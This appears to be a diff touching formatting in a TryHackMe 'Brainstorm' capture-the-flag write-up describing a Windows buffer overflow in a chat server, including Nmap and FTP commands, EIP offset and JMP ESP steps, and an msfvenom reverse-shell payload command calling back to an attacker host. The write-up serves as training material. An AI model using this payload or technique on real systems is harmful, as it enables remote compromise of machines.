@@ -2,21 +2,17 @@
 
 
 # Overview 
----
 - **Difficulty**: Medium 
 - **Platform**: Windows
 - **Link**: https://tryhackme.com/room/brainstorm
 
 ## Challenge Description 
----
->**Reverse engineer a chat program and write a script to exploit a Windows machine.
+>**Reverse engineer a chat program and write a script to exploit a Windows machine.**
 
 ## Resolution Summary 
----
 **We discovered available services with an `Nmap` scan, revealing FTP, RDP, and a chat server on port 9999. We connected to the FTP server anonymously and retrieved a `chatserver.exe` and its associated `.dll`. We transferred both files to a Windows VM running `Immunity Debugger` and `Mona` to perform buffer overflow analysis: we identified the crash, determined the `EIP` offset, checked for bad characters, found a `JMP ESP` instruction in the unprotected `essfunc.dll` module, and generated a reverse shell payload with `msfvenom`. We then ran the exploit against the live target, landing directly as Administrator with no privilege escalation required.**
 
 # Information Gathering 
----
 - **First of all, we began by running an `Nmap` scan on the target in order to find open ports. We used  the `-Pn` flag because the target does not respond to ICMP packets.** 
 ```bash
 sudo nmap -Pn 10.82.162.156
@@ -32,11 +28,10 @@ PORT     STATE SERVICE
 ```
 
 - **After a quick research, we found out that the abyss service is a web server.**
-- **We also noticed that we can connect over RDP on port `3389`.
+- **We also noticed that we can connect over RDP on port `3389`.**
 - **From here, we started by further enumerate the available services.**
 
 ## ABYSS (9999)
----
 - **We could not access the website on a web browser. And since we later discovered that there is a chatserver application available, we assumed that we could use `Netcat` to connect on this server in order to be able to access the chatserver application.** 
 ## FTP (21)
 ---
@@ -81,7 +76,6 @@ get chatserver.exe
 get essfunc.dll
 ```
 # Exploitation 
----
 - **Since we had an `.exe` program, we decided to transfer both files on a Windows VM (7 x86) where we installed `Immunity Debugger` and `Mona` for buffer overflow exploitation.** 
 
 - **We used the following command to transfer the files over:** 
@@ -116,7 +110,7 @@ python -c 'print ("A" * 8000)'
 - **From there, we launched `Immunity debugger` to further investigate the matter.** 
 - **We opened the `.exe` file in `Immunity debugger` and we ran it.** 
 
-- **After executing the same steps as before, we noticed on `Immunity Debugger` that the `EIP` was overwritten (confirming buffer overflow vulnerability). Hence, we attempted to determine the offset of the `EIP`. **
+- **After executing the same steps as before, we noticed on `Immunity Debugger` that the `EIP` was overwritten (confirming buffer overflow vulnerability). Hence, we attempted to determine the offset of the `EIP`.**
 
 - **For that purpose, we used the following binaries from `Metasploit`:** 
 ```bash
@@ -171,7 +165,7 @@ Log data, item 11
  Message=  0x625014df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Lenovo\Downloads\essfunc.dll), 0x0
 ```
 
-- **The reason why we looked for a `JMP ESP` instruction is because we want our return address (`EIP`) to point to the next instruction right after `RIP` (which will be our nop-sled+shellcode), which is stored at `ESP`. **
+- **The reason why we looked for a `JMP ESP` instruction is because we want our return address (`EIP`) to point to the next instruction right after `RIP` (which will be our nop-sled+shellcode), which is stored at `ESP`.**
 
 - **Next, we needed to generate  shellcode, we used `msfvenom` for that:** 
 ```bash
@@ -193,18 +187,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.200.109 LPORT=1234 -f c -b "
 
 - **We ended up with an Administrator shell from the get go and we obtained the root flag.** 
 # Privilege Escalation 
----
 - **None was required in this room.**
 
 
 # Trophy 
----
 **Root.txt → `5b1001de5a44eca47eee71e7942a8f8a`**
 
 # Extra Mile 
----
 - **We can write another python scripts that takes the hex dump from `Immunity debugger` as input, and it looks for badchars (instead of manual inspection).** 
 
 # Lessons Learned
----
 - **Always try multiple string lengths**: here 2000 characters were not enough, but 8000 were enough to crash the application. 
